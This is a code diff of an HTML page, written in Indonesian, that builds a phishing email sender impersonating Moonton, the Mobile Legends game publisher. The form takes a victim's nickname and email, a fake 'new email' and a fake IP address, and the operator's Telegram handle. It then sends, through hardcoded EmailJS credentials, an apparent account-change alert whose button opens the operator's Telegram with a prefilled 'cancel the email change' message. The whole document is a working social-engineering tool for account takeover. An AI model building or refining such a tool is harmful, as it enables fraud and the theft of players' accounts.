@@ -1,137 +1,173 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pusat Keamanan Akun - Moonton</title>
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script>
-        (function() {
-            // GANTI DENGAN PUBLIC KEY EMAILJS ANDA
-            emailjs.init("pep2l72BvMbtR9Jdo"); 
-        })();
-    </script>
-
+    <title>Moonton Email Sender</title>
     <style>
-        :root {
-            --primary-bg: #0a0e1b;
-            --secondary-bg: #1a2238;
-            --accent-gold: #f5d742;
-            --accent-cyan: #00ffff;
-            --text-light: #e0e0e0;
-            --text-dark: #111;
-            --border-color: #3a4a6e;
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Roboto', sans-serif;
-            background-color: var(--primary-bg);
-            color: var(--text-light);
-            background-image: url('https://i.imgur.com/gKj3a8n.jpg');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f4f4;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            margin: 0;
             padding: 20px;
+            box-sizing: border-box;
         }
         .container {
+            background-color: #fff;
+            padding: 25px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             width: 100%;
-            max-width: 500px;
-            background-color: rgba(26, 34, 56, 0.9);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 30px 40px;
-            box-shadow: 0 8px 32px rgba(0, 255, 255, 0.2);
-            backdrop-filter: blur(8px);
+            max-width: 480px;
         }
-        .header { text-align: center; margin-bottom: 30px; }
-        .header h1 { color: var(--accent-gold); font-size: 24px; font-weight: 700; text-transform: uppercase; }
-        .header p { font-size: 14px; color: var(--text-light); }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500; color: var(--accent-cyan); }
-        .form-group input { width: 100%; padding: 12px 15px; background-color: var(--primary-bg); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-light); font-size: 16px; transition: border-color 0.3s, box-shadow 0.3s; }
-        .form-group input:focus { outline: none; border-color: var(--accent-cyan); box-shadow: 0 0 10px rgba(0, 255, 255, 0.3); }
-        .submit-btn { width: 100%; padding: 14px; background: linear-gradient(90deg, var(--accent-cyan), #4d8aff); border: none; border-radius: 6px; color: var(--text-dark); font-size: 18px; font-weight: 700; cursor: pointer; text-transform: uppercase; transition: transform 0.2s, box-shadow 0.3s; }
-        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0, 255, 255, 0.4); }
-        #status { text-align: center; margin-top: 20px; font-weight: 500; height: 20px; }
-        .footer { text-align: center; margin-top: 30px; font-size: 12px; color: #8892b0; }
+        h1 {
+            font-size: 24px;
+            color: #1c1e21;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #606770;
+        }
+        input[type="text"],
+        input[type="email"] {
+            width: 100%;
+            padding: 11px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input:focus {
+            border-color: #007bff;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #d93025;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #c22a21;
+        }
+        #status {
+            text-align: center;
+            margin-top: 20px;
+            font-weight: bold;
+            padding: 10px;
+            border-radius: 6px;
+            display: none;
+        }
+        .status-success { color: #155724; background-color: #d4edda; border: 1px solid #c3e6cb; display: block; }
+        .status-error { color: #721c24; background-color: #f8d7da; border: 1px solid #f5c6cb; display: block; }
     </style>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
+
     <div class="container">
-        <div class="header">
-            <h1>Pusat Keamanan Akun</h1>
-            <p>Formulir Notifikasi Email</p>
-        </div>
-        <form id="mlbb-form">
+        <h1>Moonton Email Sender</h1>
+        <form id="email-form">
             <div class="form-group">
-                <label for="nickname">Nickname / ID</label>
-                <input type="text" id="nickname" name="nickname" placeholder="Masukkan Nickname Penerima" required>
+                <label for="nickname">Nickname Penerima</label>
+                <input type="text" id="nickname" placeholder="Contoh: Skywee" required>
             </div>
-
             <div class="form-group">
-                <label for="recipient_email">Email Penerima</label>
-                <input type="email" id="recipient_email" name="recipient_email" placeholder="contoh@gmail.com" required>
+                <label for="to-email">Email Penerima (Tujuan)</label>
+                <input type="email" id="to-email" placeholder="target@example.com" required>
             </div>
-
+            <hr style="border: none; border-top: 1px solid #eee; margin: 25px 0;">
             <div class="form-group">
-                <label for="button_link">Link Arah Tombol (Telegram/WhatsApp)</label>
-                <input type="url" id="button_link" name="button_link" placeholder="https://t.me/username_anda" required>
+                <label for="change-email">Email Baru (Untuk Ditampilkan)</label>
+                <input type="email" id="change-email" placeholder="email.baru@example.com" required>
             </div>
-
-            <input type="hidden" name="user_ip">
-            <input type="hidden" name="current_time">
-
-            <button type="submit" class="submit-btn">Kirim Notifikasi</button>
-            <div id="status"></div>
+            <div class="form-group">
+                <label for="user-ip">IP Address (Untuk Ditampilkan)</label>
+                <input type="text" id="user-ip" placeholder="103.17.10.1" required>
+            </div>
+            <div class="form-group">
+                <label for="telegram-user">Username Telegram Anda (tanpa @)</label>
+                <input type="text" id="telegram-user" placeholder="contoh: username_anda" required>
+            </div>
+            
+            <button type="submit">Kirim Email</button>
         </form>
-        <div class="footer">
-            © 2025 Moonton. All Rights Reserved.
-        </div>
+        <div id="status"></div>
     </div>
+
     <script>
-        async function enrichFormBeforeSend(form) {
-            try {
-                const response = await fetch("https://api.ipify.org?format=json");
-                const data = await response.json();
-                const now = new Date().toLocaleString("sv-SE", { timeZone: "Asia/Jakarta" });
-                form.querySelector('input[name="user_ip"]').value = data.ip;
-                form.querySelector('input[name="current_time"]').value = now;
-            } catch (err) {
-                console.error("Gagal mendapatkan IP atau waktu", err);
-                const now = new Date().toLocaleString("sv-SE", { timeZone: "Asia/Jakarta" });
-                form.querySelector('input[name="current_time"]').value = now;
-            }
-        }
-        document.getElementById('mlbb-form').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const form = this;
-            const status = document.getElementById('status');
-            const button = form.querySelector('.submit-btn');
-            status.textContent = "Mengirim...";
-            status.style.color = "var(--accent-gold)";
-            button.disabled = true;
-            await enrichFormBeforeSend(form);
-            // GANTI DENGAN SERVICE ID & TEMPLATE ID ANDA
-            emailjs.sendForm('service_1u6cx2g', 'template_kpwtj4j', form)
-                .then(() => {
-                    status.textContent = "Notifikasi berhasil dikirim!";
-                    status.style.color = "var(--accent-cyan)";
-                    form.reset();
-                }, (err) => {
-                    status.textContent = "Gagal mengirim. Coba lagi.";
-                    status.style.color = "#ff4c4c";
-                    console.error('FAILED...', err);
-                })
-                .finally(() => { button.disabled = false; });
+        document.getElementById('email-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // --- ⚠️ EDIT DI BAWAH INI ⚠️ ---
+            // Masukkan kredensial EmailJS Anda di sini
+            const serviceID = 'service_1u6cx2g';
+            const templateID = 'template_kpwtj4j';
+            const publicKey = 'pep2l72BvMbtR9Jdo';
+            // --- BATAS EDIT ---
+
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = 'Mengirim...';
+            statusEl.className = '';
+
+            // Ambil semua nilai dari form
+            const nickname = document.getElementById('nickname').value;
+            const toEmail = document.getElementById('to-email').value;
+            const changeEmail = document.getElementById('change-email').value;
+            const userIP = document.getElementById('user-ip').value;
+            const telegramUser = document.getElementById('telegram-user').value;
+
+            // Membuat link Telegram dengan pesan otomatis
+            const telegramMessage = "Please help cancel the email change request for my Moonton account.";
+            const encodedMessage = encodeURIComponent(telegramMessage);
+            const fullTelegramLink = `https://t.me/${telegramUser}?text=${encodedMessage}`;
+            
+            const currentTime = new Date().toLocaleString('id-ID', {
+                dateStyle: 'full',
+                timeStyle: 'long'
+            });
+
+            // Siapkan parameter untuk template EmailJS
+            const templateParams = {
+                to_email: toEmail,
+                nickname: nickname,
+                change_email: changeEmail,
+                user_ip: userIP,
+                button_link: fullTelegramLink, // Menggunakan link Telegram yang sudah dibuat
+                current_time: currentTime
+            };
+            
+            emailjs.init({ publicKey: publicKey });
+
+            emailjs.send(serviceID, templateID, templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    statusEl.textContent = '✅ Email berhasil dikirim!';
+                    statusEl.className = 'status-success';
+                    document.getElementById('email-form').reset();
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    statusEl.textContent = `❌ Gagal mengirim. Error: ${error.text || 'Periksa kredensial & koneksi Anda.'}`;
+                    statusEl.className = 'status-error';
+                });
         });
     </script>
 </body>
